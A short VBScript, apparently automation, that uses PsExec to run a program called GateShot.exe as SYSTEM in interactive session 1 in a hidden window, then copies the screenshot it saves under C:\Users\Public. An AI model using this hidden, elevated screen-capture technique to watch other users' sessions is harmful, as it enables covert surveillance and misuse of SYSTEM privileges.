Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
sh.Run "C:\Users\Public\PsExec64.exe -accepteula -nobanner -i 1 -s C:\Users\Public\GateShot.exe", 0, True
WScript.Sleep 4000
If fso.FileExists("C:\Users\Public\shot.png") Then
  fso.DeleteFile "C:\Users\Public\shot_state.png", True
  fso.CopyFile "C:\Users\Public\shot.png", "C:\Users\Public\shot_state.png", True
End If
